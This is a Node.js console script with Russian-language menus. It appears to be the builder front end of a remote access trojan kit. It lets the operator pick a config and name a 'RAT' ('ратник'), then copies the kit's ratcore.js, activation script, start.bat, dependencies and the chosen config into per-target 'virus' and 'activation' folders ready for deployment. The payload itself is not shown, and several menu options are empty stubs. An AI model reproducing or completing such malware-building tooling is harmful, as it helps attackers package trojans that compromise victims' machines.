const fs = require("fs-extra")
const stdio = require("stdio")

var configsobj = {
    configsfolderpath: `${__dirname}\\configs`,
    configs: {
        paths: [],
        names: [],
        localnames: []
    }
}

var menu = {}

menu.mainmenu = function () {
    return new Promise(function () {
        console.log("\n==============\n|ГЛАВНОЕ МЕНЮ|\n==============")
        stdio.ask("1. Управление конфигами\n2. Управление ратниками\n3. Перезагрузка\nВвод").then(mainmenuanswer => {
            let inp = parseInt(mainmenuanswer, 10)
            if (inp == 1) {//
                menu.configsmenu().then(() => {
                    menu.init()
                })
            } else if (inp == 2) {
                menu.ratmenu().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}

// Configs
menu.configsprint = function () {
    return new Promise(function (resolve) {
        for (let index = 0; index < configsobj.configs.paths.length; index++) {
            console.log(`${index + 1}. ${configsobj.configs.names[index]} ( ${configsobj.configs.localnames[index]} )--> ${configsobj.configs.paths[index]}`)
            //console.log(`${configsobj.configs.paths.length-1 == index}     |   ${configsobj.configs.paths.length}  |   ${index}`)
            if (configsobj.configs.paths.length - 1 == index) {
                resolve(true)
            }
        }
    })
}
menu.configsmenu = function () {
    //console.clear()
    console.log("\n======================\n|УПРАВЛЕНИЕ КОНФИГАМИ|\n======================")
    return new Promise(function (resolve) {
        menu.configsprint().then(resofprint => {
            console.log("======================")
            stdio.ask("1. Создать конфиг\n2. Удалить конфиг\n3. Скопировать конфиг\nВвод").then((answer) => {
                let intanswer = parseInt(answer, 10)
                if (intanswer == 1) {
                    
                } else if (intanswer == 2) {

                } else if (intanswer == 3) {

                } else {

                }
            })
        })
    })
}

// Rats
menu.ratdeleting = function () {
    return new Promise(function(resolve) {
        if (true) {
            console.log("DELETING")
            resolve()
        }
    })
}
menu.ratcreating = function () {

    return new Promise(function (resolve) {
        console.log("\n======================\n|==СОЗДАНИЕ РАТНИКА==|\n======================")
        menu.configsprint().then(() => {
            console.log("======================")


            stdio.ask("Выбирите конфиг, введя его порядковый номер").then(selectedconfig => {
                let intselectedconfig = parseInt(selectedconfig, 10)
                //console.log(`\n${typeof (intselectedconfig)} |   ${typeof (selectedconfig)}`)

                stdio.ask("Введите название вашего ратника (на английском, без использования спец. символов)").then(ratfilename => {

                    fs.readFile(`${__dirname}\\ratresources\\ratvirus\\ratcore.js`, 'utf8', function (err, contents) {
                        if (!err) {
                            fs.exists(`${__dirname}\\ratexes`, existratsfolder => {
                                if (!existratsfolder) {
                                    fs.mkdir(`${__dirname}\\ratexes`, err => {
                                        if (err) {
                                            console.error(err)
                                        }
                                    })

                                }
                                fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}`, err => {
                                    fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\virus`, err => {
                                        fs.mkdir(`${__dirname}\\ratexes\\${ratfilename}\\activation`, err => {
                                            // СОЗДАНО, ПЕРЕЙДИТЕ К АКТИВАЦИИ

                                            fs.copy('./ratresources/ratactivation/node_modules', `${__dirname}\\ratexes\\${ratfilename}\\activation\\node_modules`, (err) => {
                                                if (err) {
                                                    console.error("1" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy('./ratresources/ratactivation/ratactivationcore.js', `${__dirname}\\ratexes\\${ratfilename}\\activation\\ratactivationcore.js`, function (err) {
                                                if (err) {
                                                    console.error("2" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy('./ratresources/ratactivation/start.bat', `${__dirname}\\ratexes\\${ratfilename}\\activation\\start.bat`, function (err) {
                                                if (err) {
                                                    console.error("3" + err);
                                                } else {

                                                }
                                            });
                                            fs.copy(`${configsobj.configs.paths[intselectedconfig - 1]}`, `${__dirname}\\ratexes\\${ratfilename}\\activation\\config.json`, function (err) {
                                                if (err) {
                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
                                                } else {

                                                }
                                            });
                                            fs.copy(`./ratresources/ratvirus/node_modules`, `${__dirname}\\ratexes\\${ratfilename}\\virus\\node_modules`, function (err) {
                                                if (err) {
                                                    console.error(`${configsobj.configs.paths[intselectedconfig]}`);
                                                } else {

                                                }
                                            });
                                            resolve()
                                        })
                                    })
                                })
                            })
                        } else {

                        }
                    });

                })
            })
        })
    })
}
menu.ratmenu = function () {
    return new Promise(function () {
        console.log("===============\n|МЕНЮ РАТНИКОВ|\n===============")
        stdio.ask("1. Создать ратник\n2. Удалить ратник\nВвод").then(answer => {
            let intanswer = parseInt(answer, 10)

            if (intanswer == 1) {
                menu.ratcreating().then(() => {
                    menu.init()
                })
            } else if (intanswer == 2) {
                menu.ratdeleting().then(() => {
                    menu.init()
                })
            } else {
                menu.init()
            }
        })
    })
}

// Sys
menu.reloadconfigs = function () {
    return new Promise(function (resolve, reject) {
        fs.readdir(configsobj.configsfolderpath, (err, files) => {
            new Promise(function (resolve, reject) {
                if (files.length == 0) {
                    resolve(true)
                } else {
                    configsobj.configs.paths = []
                    configsobj.configs.names = []
                    for (let index = 0; index < files.length; index++) {
                        fs.stat(`${configsobj.configsfolderpath}/${files[index]}`, (err, stats) => {
                            if (stats.isFile() == true) {
                                let lastchar = files[index].split(".")
                                if (lastchar[lastchar.length - 1] == "json") {
                                    configsobj.configs.paths[configsobj.configs.paths.length] = `${configsobj.configsfolderpath}/${files[index]}`
                                    let conf = require(`${configsobj.configs.paths[configsobj.configs.paths.length - 1]}`)
                                    configsobj.configs.localnames[configsobj.configs.names.length] = conf.localname
                                    configsobj.configs.names[configsobj.configs.names.length] = lastchar[0]
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                } else {
                                    if (index >= files.length - 1) {
                                        resolve(true)
                                    }
                                }
                            } else {
                                if (index >= files.length - 1) {
                                    resolve(true)
                                }
                            }
                        })
                    }
                }

            }).then(result => {
                resolve(true)
            })
        })
    })
}
menu.init = function () {

    menu.reloadconfigs().then(isGoodScanned => {
        if (isGoodScanned) {
            menu.mainmenu()
        } else {

        }
    })
}
fs.exists(configsobj.configsfolderpath, isHereConfigsFolder => {
    if (isHereConfigsFolder) {
        menu.init()
    } else {
        console.log("Отсутвует папка configs... " + __dirname)
        fs.mkdir(configsobj.configsfolderpath, err => {
            if (err) {

            } else {
                console.log("Программа создала папку configs...")
                menu.init()
            }
        })
    }
})